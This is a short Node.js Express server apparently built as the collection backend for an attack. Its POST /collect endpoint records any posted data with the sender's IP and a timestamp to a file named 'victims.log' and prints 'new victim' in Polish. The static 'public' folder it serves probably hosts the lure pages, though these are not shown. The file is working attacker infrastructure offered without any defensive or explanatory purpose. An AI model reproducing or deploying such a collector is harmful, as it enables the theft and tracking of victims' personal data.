const express = require('express');
const fs = require('fs');
const app = express();
app.use(express.json());
app.use(express.static('public'));

app.post('/collect', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const data = req.body;
    data.ip = ip;
    data.timestamp = new Date().toISOString();
    fs.appendFileSync('victims.log', JSON.stringify(data) + '\n');
    console.log('Nowa ofiara:', ip);
    res.send('OK');
});

app.listen(8080, '0.0.0.0', () => console.log('Server running'));
